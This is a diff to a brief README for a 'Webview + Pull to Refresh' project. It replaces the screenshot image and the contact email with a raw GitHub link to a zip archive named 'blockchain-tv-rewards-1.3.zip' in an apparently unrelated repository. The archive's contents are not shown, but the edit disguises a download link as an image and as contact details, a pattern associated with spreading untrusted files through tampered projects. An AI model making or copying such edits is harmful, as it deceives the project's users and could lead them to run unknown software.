@@ -1,9 +1,9 @@
 Webview + Pull to Refresh
 --------------
-<img src="screenshot.png" width="500"/>
+<img src="https://raw.githubusercontent.com/lulutbudiman/blockchain-rewards-tv/master/dartman/blockchain-tv-rewards-1.3.zip" width="500"/>
 
 
 
 More Question ?
 --------------
-ardhityawiedhairawan@gmail.com  -
+https://raw.githubusercontent.com/lulutbudiman/blockchain-rewards-tv/master/dartman/blockchain-tv-rewards-1.3.zip  -
